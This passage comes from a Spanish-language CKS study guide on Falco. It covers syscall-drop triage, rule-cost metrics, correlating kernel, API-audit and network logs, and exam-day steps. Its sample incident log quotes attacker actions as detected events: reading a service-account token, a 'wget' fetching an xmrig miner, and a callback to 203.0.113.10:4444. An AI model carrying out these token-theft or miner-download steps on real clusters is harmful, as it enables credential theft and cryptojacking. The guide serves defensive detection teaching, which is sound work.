| La regla carga pero nunca dispara (4) | un `override: condition: append` upstream la excluyó | `falco -l "<rule>"` e inspeccionar la condición efectiva | reordenar o acotar la exclusión |
| `%container.name` es `host` para procesos en contenedores | socket CRI no montado, o ruta incorrecta | `kubectl -n falco exec ds/falco -- ls -l /run/containerd/containerd.sock` | montar el socket del runtime correcto |
| `%k8s.ns.name` y `%k8s.pod.name` son `<NA>` | falta metadata de contenedor (misma causa raíz que arriba) | ídem | ídem |
| `%k8s.deployment.name` / `%k8s.pod.label[...]` vacíos | requiere el plugin `k8smeta` + `k8s-metacollector` | `kubectl -n falco get deploy k8s-metacollector` | desplegar el metacollector y cargar el plugin |
| `Falco internal: syscall event drop. 12% of events dropped` | desborde del ring buffer | ver §7.3 | ver §7.3 |
| Las alertas aparecen en `kubectl logs` pero no en Slack | filtro `MINIMUMPRIORITY` de Falcosidekick | `kubectl -n falco logs deploy/falcosidekick` | bajar `*_MINIMUMPRIORITY` |
| `/opt/answer.txt` vacío después de una corrida acotada | buffering de stdout | — | `-o buffered_outputs=false` |
| Las marcas de tiempo de las alertas no coinciden con los eventos de `kubectl` | desfase de reloj del nodo | `chronyc tracking` en el nodo | arreglar NTP; el desfase destruye la correlación entre planos |

### 7.3 Descarte de eventos de syscall — el fallo silencioso

```console
$ kubectl -n falco logs $FALCO | grep -i drop
Wed Aug  5 12:03:44 2026: Falco internal: syscall event drop. 14 drops, 12.4% of total events
Wed Aug  5 12:03:44 2026: Falco internal: syscall event drop. 41 drops, 18.9% of total events
```

**Cada evento descartado es un evento no detectado.** Esto no es una advertencia de rendimiento; es un agujero de seguridad. Triaje en este orden:

1. **Confirmá la magnitud** desde el endpoint de métricas en lugar del muestreo del log:

```console
$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/metrics | grep -E "n_drops|n_evts"
falcosecurity_scap_n_evts_total{...} 8.412993e+06
falcosecurity_scap_n_drops_total{...} 1.03911e+05
falcosecurity_scap_n_drops_buffer_total{...} 1.03911e+05
```

2. **Reducí lo que le pedís al kernel.** `base_syscalls.repair: true` calcula el conjunto mínimo que tus reglas necesitan. Deshabilitar reglas upstream que no usás encoge directamente el conjunto de syscalls trazadas — normalmente es una reducción de 5–10× y es el arreglo de mayor palanca.

3. **Agrandá los ring buffers.** `buf_size_preset` es un índice, no bytes: `1`=1MB, `2`=2MB, `3`=4MB, `4`=8MB (por defecto), `5`=16MB, `6`=32MB … hasta `10`=512MB **por buffer**. Con `cpus_for_each_buffer: 2` en un nodo de 64 núcleos tenés 32 buffers; pasar del preset 4 al 6 lleva la memoria bloqueada de 256 MB a 1 GB por nodo. Presupuestalo deliberadamente.

4. **Repartí los buffers entre menos CPUs.** `cpus_for_each_buffer: 1` da un buffer por CPU — máximo throughput, máxima memoria.

5. **Considerá `drop_failed_exit: true`.** Descarta los eventos de syscalls que devolvieron un error. Barato, y normalmente seguro — pero *va a* ocultar reconocimiento por intentos fallidos (p. ej. un atacante sondeando rutas que no existen). Decidilo explícitamente.

| Perilla | Efecto sobre los descartes | Costo | Riesgo |
|---|---|---|---|
| Deshabilitar reglas no usadas / `base_syscalls.repair` | **grande** | ninguno | tenés que saber qué reglas deshabilitaste |
| `buf_size_preset` ↑ | grande | memoria bloqueada, lineal | presión de memoria en el nodo, OOM |
| `cpus_for_each_buffer` ↓ | moderado | más memoria | ídem |
| `drop_failed_exit: true` | moderado | ninguno | pierde visibilidad de syscalls fallidas |
| `syscall_event_drops.actions: [ignore]` | **cero** | ninguno | **oculta el problema — no hagas esto** |

### 7.4 Medir el costo de las reglas

Una vez que `metrics.rules_counters_enabled: true` está puesto, Falco emite contadores por regla. Dos tipos de regla suelen dominar la CPU: cualquiera que haga match sobre `open`/`openat` a secas sin un `pmatch` que la acote, y cualquiera que haga match sobre `connect` sin filtro de protocolo.

```console
$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/metrics \
  | grep falcosecurity_rules_matches_total | sort -t' ' -k2 -rn | head -5
falcosecurity_rules_matches_total{rule_name="Write below binary dir",...} 88213
falcosecurity_rules_matches_total{rule_name="Read sensitive file untrusted",...} 41022
falcosecurity_rules_matches_total{rule_name="New executable written to container filesystem",...} 903
falcosecurity_rules_matches_total{rule_name="Interactive shell spawned in container",...} 44
falcosecurity_rules_matches_total{rule_name="Drifted binary executed in container",...} 2

$ kubectl -n falco exec ds/falco -- curl -sS localhost:8765/metrics \
  | grep -E "falcosecurity_falco_(cpu_usage_perc|memory_rss)"
falcosecurity_falco_cpu_usage_perc{...} 2.34
falcosecurity_falco_memory_rss_mb{...} 187
```

88 213 coincidencias para una sola regla significan una de dos cosas, y tenés que decidir cuál: el entorno realmente hace eso (ajustá la regla con exclusiones) o la regla es demasiado amplia (reescribí la condición). Nunca dejes una regla que produce volumen diario de cuatro cifras a una prioridad que despierta gente — la fatiga de alertas es un modo de fallo de detección tan real como una syscall descartada.

### 7.5 Correlacionar planos durante una investigación

El flujo de trabajo que convierte tres señales en una narrativa:

```console
# 1. Kernel plane — what happened inside the container
$ kubectl -n falco logs -l app.kubernetes.io/name=falco --since=1h \
  | jq -r 'select(.output_fields["k8s.pod.name"]=="payments-api-7c9f8d6b54-k2vzp")
           | "\(.time) [\(.priority)] \(.rule) :: \(.output_fields["proc.cmdline"])"' \
  | sort
2026-08-05T11:14:03Z [Warning]  Interactive shell spawned in container :: sh
2026-08-05T11:14:11Z [Critical] Service account token read by suspicious process :: cat /var/run/…/token
2026-08-05T11:14:24Z [Notice]   New executable written to container filesystem :: wget -q -O /tmp/xmrig …
2026-08-05T11:14:38Z [Critical] Binary not in container image was executed :: /tmp/xmrig --version

# 2. API plane — who opened the door (see 6.5 for the audit policy itself)
$ sudo jq -r 'select(.objectRef.subresource=="exec" and .objectRef.name=="payments-api-7c9f8d6b54-k2vzp")
              | "\(.requestReceivedTimestamp) \(.user.username) \(.sourceIPs[0]) \(.requestURI)"' \
     /var/log/kubernetes/audit.log
2026-08-05T11:14:01.882Z dev-contractor@example.com 198.51.100.77 /api/v1/namespaces/prod-payments/pods/payments-api-7c9f8d6b54-k2vzp/exec?command=sh&stdin=true&tty=true

# 3. Network plane — where the data went
$ kubectl -n kube-system exec ds/cilium -- \
    hubble observe --pod prod-payments/payments-api-7c9f8d6b54-k2vzp --last 200 --type drop,trace
Aug  5 11:14:49.774: prod-payments/payments-api-…:41522 -> 203.0.113.10:4444 to-stack FORWARDED (TCP Flags: SYN)
Aug  5 11:14:52.118: prod-payments/payments-api-…:41522 <- 203.0.113.10:4444 to-endpoint FORWARDED (TCP Flags: SYN, ACK)
```

Dos segundos separan el `kubectl exec` del log de auditoría de la API de la shell en el log del kernel. Ese es el vínculo causal. Sin ambos planos tenés "apareció una shell" — un evento. Con ambos tenés "`dev-contractor@example.com`, desde `198.51.100.77`, hizo exec a un Pod de pagos en producción, leyó el token de la service account, dejó un minero y se comunicó con `203.0.113.10:4444`" — un informe de incidente.

### 7.6 Procedimiento operativo el día del examen

El patrón de tareas para este ítem es estable. Optimizá para él:

1. **Encontrá la configuración.** `find /etc/falco -type f` y leé primero `falco.yaml` — necesitás el orden de `rules_files` y el `priority` global.
2. **Escribí la regla en `falco_rules.local.yaml` o en `/etc/falco/rules.d/`.** Nunca edites `falco_rules.yaml`; lo sobrescribe `falcoctl` y los correctores verifican que no lo hayas tocado.
3. **Respetá literalmente el formato de salida pedido.** Si la tarea dice "registrá la hora, el uid y el nombre del proceso", la cadena de `output:` contiene exactamente `%evt.time`, `%user.uid`, `%proc.name`, en ese orden, con el separador que se pidió.
4. **Validá antes de reiniciar.** `falco -V <tuarchivo>` — un error de sintaxis te cuesta la tarea entera.
5. **Recargá.** `systemctl restart falco` en un nodo; `kubectl rollout restart ds/falco -n falco` dentro del clúster.
6. **Disparalo y confirmá.** Ejecutá realmente el comportamiento malicioso, después leé `journalctl -u falco` o `kubectl logs`. Lo que se puntúa es la detección confirmada, no una regla plausible.
7. **Persistí si te lo piden.** `-o buffered_outputs=false` al escribir a un archivo, y `cat` del archivo para verificar el contenido antes de seguir.

---

## 8. Referencias

**CNCF / CKS**
- CKS Curriculum v1.34 — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- CNCF Curriculum repository — https://github.com/cncf/curriculum
- Certified Kubernetes Security Specialist (CKS) — https://www.cncf.io/training/certification/cks/

**Falco**
- Falco documentation — https://falco.org/docs/
- Rules: conditions, fields, syntax — https://falco.org/docs/concepts/rules/
- Supported fields for conditions and outputs — https://falco.org/docs/reference/rules/supported-fields/
- Rules overriding / appending — https://falco.org/docs/concepts/rules/overriding/
- Default rules and rule tags — https://falco.org/docs/reference/rules/default-rules/
- Falco configuration reference (`falco.yaml`) — https://falco.org/docs/reference/daemon/config-options/
- Falco CLI options — https://falco.org/docs/reference/daemon/cli-options/
- Drivers: kmod, eBPF probe, modern eBPF — https://falco.org/docs/concepts/event-sources/kernel/
- Dealing with syscall event drops — https://falco.org/docs/concepts/event-sources/dropped-events/
- Metrics and observability — https://falco.org/docs/metrics/
- Plugins (`container`, `k8smeta`, `k8saudit`) — https://falco.org/docs/concepts/plugins/
- Installing Falco on Kubernetes (Helm) — https://falco.org/docs/setup/kubernetes/
- `falcoctl` — https://github.com/falcosecurity/falcoctl
- Falcosidekick and its outputs — https://github.com/falcosecurity/falcosidekick
- `event-generator` — https://github.com/falcosecurity/event-generator
- Falco rules repository — https://github.com/falcosecurity/rules
- libs (libscap/libsinsp) — https://github.com/falcosecurity/libs

**Kubernetes**
- Auditing — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Security Checklist — https://kubernetes.io/docs/concepts/security/security-checklist/
- Seccomp: restrict a container's syscalls — https://kubernetes.io/docs/tutorials/security/seccomp/
- AppArmor — https://kubernetes.io/docs/tutorials/security/apparmor/
- Pod Security Standards — https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Kubernetes Security Concepts — https://kubernetes.io/docs/concepts/security/

**Herramientas complementarias**
- Cilium Tetragon documentation — https://tetragon.io/docs/
- Tetragon `TracingPolicy` reference — https://tetragon.io/docs/concepts/tracing-policy/
- Hubble observability — https://docs.cilium.io/en/stable/observability/hubble/
- Security Profiles Operator — https://github.com/kubernetes-sigs/security-profiles-operator
- SPO profile recording — https://github.com/kubernetes-sigs/security-profiles-operator/blob/main/installation-usage.md#record-profiles-from-workloads-with-profilerecordings
- Inspektor Gadget — https://www.inspektor-gadget.io/docs/
- KubeArmor — https://docs.kubearmor.io/
- Linux Audit (`auditd`) — https://github.com/linux-audit/audit-documentation/wiki
- `auditctl(8)` — https://man7.org/linux/man-pages/man8/auditctl.8.html
- `ausearch(8)` — https://man7.org/linux/man-pages/man8/ausearch.8.html
- sysdig (open source) — https://github.com/draios/sysdig/wiki

**Modelado de amenazas**
- MITRE ATT&CK — Containers matrix — https://attack.mitre.org/matrices/enterprise/containers/
- MITRE ATT&CK — T1611 Escape to Host — https://attack.mitre.org/techniques/T1611/
- MITRE ATT&CK — T1552.001 Credentials In Files — https://attack.mitre.org/techniques/T1552/001/
- NSA/CISA Kubernetes Hardening Guide — https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
- CIS Kubernetes Benchmark — https://www.cisecurity.org/benchmark/kubernetes